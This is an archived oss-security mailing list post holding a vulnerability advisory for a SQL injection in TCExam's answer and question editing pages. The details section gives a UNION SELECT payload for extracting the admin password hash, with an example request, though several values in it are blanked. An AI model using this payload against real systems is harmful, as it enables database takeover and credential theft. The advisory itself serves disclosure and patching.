  oss-security - TCExam Edit SQL Injection             Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 13 Aug From: "research" <research@...ctionis.co.uk> To: "'full-disclosure'" <full-disclosure@...ts.grok.org.uk>, 	"'bugtraq'" <bugtraq@...urityfocus.com>, 	<secalert@...urityreason.com>, 	<bugs@...uritytracker.com>, 	"'vuln'" <vuln@...unia.com>, 	<vuln@...urity.nnov.ru>, 	<news@...uriteam.com>, 	<moderators@...db.org>, 	<submissions@...ketstormsecurity.org>, 	<submit@...ecurity.com>, 	<oss-security@...ts.openwall.com> Subject: TCExam Edit SQL Injection   /---------------------------\  | TCExam Edit SQL Injection |  \---------------------------/        Summary  =======     TCExam is prone to a SQL injection flaw located in tce_edit_answer.php and tce_edit_question.php. These files pass a 'subject_module_id' parameter into a SQL statement without satisfactory sanitisation. An attacker with authoring permissions could leverage this vulnerability to take full control of the database.     CVE number:  Impact: High  Vendor homepage: http://www.tcexam.org/  Vendor notified:  Vendor fixed:  Credit: Chris Cooper of Reaction Information Security (http://www.reactionis.co.uk/)     This advisory is posted at:     http://www.reactionpenetrationtesting.co.uk/tcexam-sql-injection.html        Affected Products  ======== ========     Confirmed in TCExam Prior versions may also be affected.        Details  =======     The 'subject_module_id' parameters in the tce_edit_answer.php and tce_edit_question.php pages were found to be subject to a SQL injection vulnerability. It was possible to inject arbitrary SQL statements into a WHERE clause, retrieving information from the database via the page output. The attacker must be authenticated as a valid user with a permission level of 5 or above in order for the attack to be successful.     The following payload will extract the admin password hash (some characters may need to be URL encoded):     union all select (select from `tcexam`.tce_users where tce_users.user_name = limit 0,1)     ---  Example Request:  +---------------     GET _id=3&answer_question_id=7 HTTP/1.1  Host:  Referer:  Cookie:     ---  Example Response:  +----------------     --- SNIP ---  <select name="question_subject_id" id="question_subject_id" size="0" onchange="document.getElementById('form_answereditor').changesubject.value=1 ; document.getElementById('form_answereditor').submit();" title="test topic"> <option - [%00]</option> </select>  --- SNIP ---     Impact  ======     An authenticated user with a permission level of 5 or higher could take full control of the database, essentially allowing them to escalate their privileges by either directly controlling the database, cracking an administrator password or potentially changing their own permission level. Furthermore, an attacker might be able to leverage this vulnerability in order to further compromise the host machine.     Solution  ========     Upgrade to TCExam        Distribution  ============     In addition to posting on the website, a text version of this notice has been posted to the following e-mail and Usenet news recipients.     * bugtraq () securityfocus com  * full-disclosure () lists grok org uk     Future updates of this advisory, if any, will be placed on the ReactionIS corporate website, but may or may not be actively announced on mailing lists or newsgroups. Users concerned about this problem are encouraged to check the URL below for any updates:     http://www.reactionpenetrationtesting.co.uk/tcexam-sql-injection.html     ============================================================================ ==     Reaction Information Security   Lombard House Business Centre,  Suite  Upper Bridge Street,  Canterbury, Kent, CT1 2NF     Phone: +44  Email: research () reactionis {dot} co {dot} uk  Web: http://www.reactionpenetrationtesting.co.uk    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      